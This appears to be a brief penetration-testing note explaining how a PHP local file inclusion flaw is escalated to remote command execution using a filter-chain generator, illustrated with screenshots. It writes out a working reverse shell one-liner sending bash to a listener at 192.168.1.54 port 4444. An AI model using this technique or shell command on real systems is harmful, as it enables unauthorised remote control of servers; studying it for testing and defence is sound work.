# LFI to Remote Command Execution via PHP Filter Chain.
We have to `git clone` the next repository: [https://github.com/synacktiv/php_filter_chain_generator/tree/main].
We make the chain specifyng the command we want to introduce in the target and we used it in the vulnerable filename input.

## LFI 2 RCE.
![1](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/2956e425-1116-473f-b2cd-4be072498ab6)
![3](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/01c597ca-cb77-4c1e-825d-e2694a0e246f)

## Reverse shell via PHP Filter Chain.
It's important to URLencode the `&` as `%26`. `bash -c "bash -i >%26 /dev/tcp/192.168.1.54/4444 0>%261"`.
![4](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/0843c1da-f798-48fa-a4fa-ca95c82b408e)
![5](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/1deb2f94-2a7f-43de-9ae2-47aebc1b4769)
